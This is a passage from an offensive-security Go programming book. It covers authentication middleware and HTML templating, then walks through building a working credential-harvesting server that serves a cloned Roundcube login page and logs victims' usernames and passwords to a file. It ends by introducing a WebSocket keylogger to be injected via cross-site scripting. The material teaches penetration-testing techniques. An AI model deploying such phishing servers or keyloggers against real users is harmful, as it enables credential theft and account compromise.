}
ctx := context.WithValue(r.Context(), "username", username) ❺
r = r.WithContext(ctx) ❻
next(w, r)
}
func hello(w http.ResponseWriter, r *http.Request) {
username := r.Context().Value("username").(string) ❼
fmt.Fprintf(w, "Hi %s\n", username)
}
func main() {
r := mux.NewRouter()
r.HandleFunc("/hello", hello).Methods("GET")
n := negroni.Classic()
n.Use(&badAuth{
Username: "admin",
Password: "password",
})
n.UseHandler(r)
http.ListenAndServe(":8000", n)
}
Listing 4-5: Using context in handlers (/ch-4/negroni_example/main.go)
You’ve added new middleware, badAuth, that is going to
simulate authentication, purely for demonstration purposes ❶.
This new type has two fields, Username and Password, and
implements negroni.Handler, since it defines the three-parameter
version of the ServeHTTP() method ❷ we discussed previously.
Inside the ServeHTTP() method, you first grab the username and
password from the request ❸, and then compare them to the
fields you have. If the username and password are incorrect,
execution is stopped, and a 401 response is written to the
requester.
Notice that you return ❹ before calling next(). This prevents
the remainder of the middleware chain from executing. If the
credentials are correct, you go through a rather verbose routine
of adding the username to the request context. You first call
context.WithValue() to initialize the context from the request,
setting a variable named username on that context ❺. You then
make sure the request uses your new context by calling
r.WithContext(ctx) ❻. If you plan on writing web applications
with Go, you’ll want to become familiar with this pattern, as
you’ll be using it a lot.
In the hello() function, you get the username from the
request context by using the Context().Value(interface{}) function,
which itself returns an interface{}. Because you know it’s a
string, you can use a type assertion here ❼. If you can’t
guarantee the type, or you can’t guarantee that the value will
exist in the context, use a switch routine for conversion.
Build and execute the code from Listing 4-5 and send a few
requests to the server. Send some with both correct and
incorrect credentials. You should see the following output:
$ curl -i http://localhost:8000/hello
HTTP/1.1 401 Unauthorized
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Thu, 16 Jan 2020 20:41:20 GMT
Content-Length: 13
Unauthorized
$ curl -i 'http://localhost:8000/hello?username=admin&password=password'
HTTP/1.1 200 OK
Date: Thu, 16 Jan 2020 20:41:05 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8
Hi admin
Making a request without credentials results in your
middleware returning a 401 Unauthorized error. Sending the
same request with a valid set of credentials produces a super-
secret greeting message accessible only to authenticated users.
That was an awful lot to digest. Up to this point, your
handler functions have solely used fmt.FPrintf() to write your
response to the http.ResponseWriter instance. In the next section,
you’ll look at a more dynamic way of returning HTML by
using Go’s templating package.
Using Templates to Produce HTML Responses
Templates allow you to dynamically generate content,
including HTML, with variables from Go programs. Many
languages have third-party packages that allow you to generate
templates. Go has two templating packages, text/template and
html/template. In this chapter, you’ll use the HTML package,
because it provides the contextual encoding you need.
One of the fantastic things about Go’s package is that it’s
contextually aware: it will encode your variable differently
depending on where the variable is placed in the template. For
example, if you were to supply a string as a URL to an href
attribute, the string would be URL encoded, but the same
string would be HTML encoded if it rendered within an
HTML element.
To create and use templates, you first define your template,
which contains a placeholder to denote the dynamic contextual
data to render. Its syntax should look familiar to readers who
have used Jinja with Python. When you render the template,
you pass to it a variable that’ll be used as this context. The
variable can be a complex structure with several fields, or it
can be a primitive variable.
Let’s work through a sample, shown in Listing 4-6, that
creates a simple template and populates a placeholder with
JavaScript. This is a contrived example that shows how to
dynamically populate content returned to the browser.
package main
import (
"html/template"
"os"
)
❶ var x = `
❷ Hello {{.}}
`
func main() {
❸ t, err := template.New("hello").Parse(x)
if err != nil {
panic(err)
}
❹ t.Execute(os.Stdout, "")
}
Listing 4-6: HTML templating (/ch-4/template_example/main.go)
The first thing you do is create a variable, named x, to store
your HTML template ❶. Here you’re using a string embedded
in your code to define your template, but most of the time
you’ll want to store your templates as separate files. Notice
that the template is nothing more than a simple HTML page.
Inside the template, you define placeholders by using the
{{variable-name}} convention, where variable-name is the data
element within your contextual data that you’ll want to render
❷. Recall that this can be a struct or another primitive. In this
case, you’re using a single period, which tells the package that
you want to render the entire context here. Since you’ll be
working with a single string, this is fine, but if you had a larger
and more complex data structure, such as a struct, you could
get only the fields you want by calling past this period. For
example, if you passed a struct with a Username field to the
template, you could render the field by using {{.Username}}.
Next, in your main() function, you create a new template by
calling template.New(string) ❸. Then you call Parse(string) to ensure
that the template is properly formatted and to parse it.
Together, these two functions return a new pointer to a
Template.
While this example uses only a single template, it’s
possible to embed templates in other templates. When using
multiple templates, it’s important that you name them in order
to be able to call them. Finally, you call Execute(io.Writer,
interface{}) ❹, which processes the template by using the
variable passed as the second argument and writes it to the
provided io.Writer. For demonstration purposes, you’ll use
os.Stdout. The second variable you pass into the Execute() method
is the context that’ll be used for rendering the template.
Running this produces HTML, and you should notice that
the script tags and other nefarious characters that were
provided as part of your context are properly encoded. Neat-o!
$ go build -o template_example
$ ./template_example
Hello &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;
We could say a lot more about templates. You can use
logical operators with them; you can use them with loops and
other control structures. You can call built-in functions, and
you can even define and expose arbitrary helper functions to
greatly expand the templating capabilities. Double neat-o! We
recommend you dive in and research these possibilities.
They’re beyond the scope of this book, but are powerful.
How about you step away from the basics of creating
servers and handling requests and instead focus on something
more nefarious. Let’s create a credential harvester!
CREDENTIAL HARVESTING
One of the staples of social engineering is the credential-
harvesting attack. This type of attack captures users’ login
information to specific websites by getting them to enter their
credentials in a cloned version of the original site. The attack
is useful against organizations that expose a single-factor
authentication interface to the internet. Once you have a user’s
credentials, you can use them to access their account on the
actual site. This often leads to an initial breach of the
organization’s perimeter network.
Go provides a great platform for this type of attack,
because it’s quick to stand up new servers, and because it
makes it easy to configure routing and to parse user-supplied
input. You could add many customizations and features to a
credential-harvesting server, but for this example, let’s stick to
the basics.
To begin, you need to clone a site that has a login form.
There are a lot of possibilities here. In practice, you’d
probably want to clone a site in use by the target. For this
example, though, you’ll clone a Roundcube site. Roundcube is
an open source webmail client that’s not used as often as
commercial software, such as Microsoft Exchange, but will
allow us to illustrate the concepts just as well. You’ll use
Docker to run Roundcube, because it makes the process easier.
You can start a Roundcube server of your own by
executing the following. If you don’t want to run a Roundcube
server, then no worries; the exercise source code has a clone of
the site. Still, we’re including this for completeness:
$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
The command starts a Roundcube Docker instance. If you
navigate to http://127.0.0.1:80, you’ll be presented with a
login form. Normally, you’d use wget to clone a site and all its
requisite files, but Roundcube has JavaScript awesomeness
that prevents this from working. Instead, you’ll use Google
Chrome to save it. In the exercise folder, you should see a
directory structure that looks like Listing 4-7.
$ tree
.
+-- main.go
+-- public
+-- index.html
+-- index_files
+-- app.js
+-- common.js
+-- jquery-ui-1.10.4.custom.css
+-- jquery-ui-1.10.4.custom.min.js
+-- jquery.min.js
+-- jstz.min.js
+-- roundcube_logo.png
+-- styles.css
+-- ui.js
index.html
Listing 4-7: Directory listing for /ch-4/credential_harvester/
The files in the public directory represent the unaltered
cloned login site. You’ll need to modify the original login
form to redirect the entered credentials, sending them to
yourself instead of the legitimate server. To begin, open
public/index.html and find the form element used to POST the
login request. It should look something like the following:
You need to modify the action attribute of this tag and point
it to your server. Change action to /login. Don’t forget to save it.
The line should now look like the following:
To render the login form correctly and capture a username
and password, you’ll first need to serve the files in the public
directory. Then you’ll need to write a HandleFunc for /login to
capture the username and password. You’ll also want to store
the captured credentials in a file with some verbose logging.
You can handle all of this in just a few dozen lines of code.
Listing 4-8 shows the program in its entirety.
package main
import (
"net/http"
"os"
"time"
log "github.com/Sirupsen/logrus" ❶
"github.com/gorilla/mux"
)
func login(w http.ResponseWriter, r *http.Request) {
log.WithFields(log.Fields{ ❷
"time": time.Now().String(),
"username": r.FormValue("_user"), ❸
"password": r.FormValue("_pass"), ❹
"user-agent": r.UserAgent(),
"ip_address": r.RemoteAddr,
}).Info("login attempt")
http.Redirect(w, r, "/", 302)
}
func main() {
fh, err := os.OpenFile("credentials.txt",
os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) ❺
if err != nil {
panic(err)
}
defer fh.Close()
log.SetOutput(fh) ❻
r := mux.NewRouter()
r.HandleFunc("/login", login).Methods("POST") ❼
r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) ❽
log.Fatal(http.ListenAndServe(":8080", r))
}
Listing 4-8: Credential-harvesting server (/ch-4/credential_harvester/main.go)
The first thing worth noting is you import
github.com/Sirupsen/logrus ❶. This is a structured logging package
that we prefer to use instead of the standard Go log package. It
provides more configurable logging options for better error
handling. To use this package, you’ll need to make sure you
ran go get beforehand.
Next, you define the login() handler function. Hopefully, this
pattern looks familiar. Inside this function, you use
log.WithFields() to write out your captured data ❷. You display
the current time, the user-agent, and IP address of the
requester. You also call FormValue(string) to capture both the
username (_user) ❸ and password (_pass) ❹ values that were
submitted. You get these values from index.html and by
locating the form input elements for each username and
password. Your server needs to explicitly align with the names
of the fields as they exist in the login form.
The following snippet, extracted from index.html, shows
the relevant input items, with the element names in bold for
clarity:
In your main() function, you begin by opening a file that’ll
be used to store your captured data ❺. Then, you use
log.SetOutput(io.Writer), passing it the file handle you just created,
to configure the logging package so that it’ll write its output to
that file ❻. Next, you create a new router and mount the login()
handler function ❼.
Prior to starting the server, you do one more thing that may
look unfamiliar: you tell your router to serve static files from a
directory ❽. That way, your Go server explicitly knows where
your static files—images, JavaScript, HTML—live. Go makes
this easy, and provides protections against directory traversal
attacks. Starting from the inside out, you use http.Dir(string) to
define the directory from which you wish to serve the files.
The result of this is passed as input to http.FileServer(FileSystem),
which creates an http.Handler for your directory. You’ll mount
this to your router by using PathPrefix(string). Using / as a path
prefix will match any request that hasn’t already found a
match. Note that, by default, the handler returned from
FileServer does support directory indexing. This could leak some
information. It’s possible to disable this, but we won’t cover
that here.
Finally, as you have before, you start the server. Once
you’ve built and executed the code in Listing 4-8, open your
web browser and navigate to http://localhost:8080. Try
submitting a username and password to the form. Then head
back to the terminal, exit the program, and view the
credentials.txt file, shown here:
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0038] login attempt
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13
21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux
x86_64;
rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
Look at those logs! You can see that you submitted the
username of bob and the password of p@ssw0rd1!. Your
malicious server successfully handled the form POST request,
captured the entered credentials, and saved them to a file for
offline viewing. As an attacker, you could then attempt to use
these credentials against the target organization and proceed
with further compromise.
In the next section, you’ll work through a variation of this
credential-harvesting technique. Instead of waiting for form
submission, you’ll create a keylogger to capture keystrokes in
real time.
KEYLOGGING WITH THE
WEBSOCKET API
The WebSocket API (WebSockets), a full duplex protocol, has
increased in popularity over the years and many browsers now
support it. It provides a way for web application servers and
clients to efficiently communicate with each other. Most
importantly, it allows the server to send messages to a client
without the need for polling.
WebSockets are useful for building “real-time”
applications, such as chat and games, but you can use them for
nefarious purposes as well, such as injecting a keylogger into
an application to capture every key a user presses. To begin,
imagine you’ve identified an application that is vulnerable to
cross-site scripting (a flaw through which a third party can run
arbitrary JavaScript in a victim’s browser) or you’ve
compromised a web server, allowing you to modify the
application source code. Either scenario should let you include
a remote JavaScript file. You’ll build the server infrastructure
to handle a WebSocket connection from a client and handle
incoming keystrokes.
For demonstration purposes, you’ll use JS Bin
(http://jsbin.com) to test your payload. JS Bin is an online
playground where developers can test their HTML and
JavaScript code. Navigate to JS Bin in your web browser and
paste the following HTML into the column on the left,
completely replacing the default code:
Login
On the right side of the screen, you’ll see the rendered
form. As you may have noticed, you’ve included a script tag
with the src attribute set to http://localhost:8080/k.js. This is going to
be the JavaScript code that will create the WebSocket
connection and send user input to the server.
Your server is going to need to do two things: handle the
WebSocket and serve the JavaScript file. First, let’s get the
JavaScript out of the way, since after all, this book is about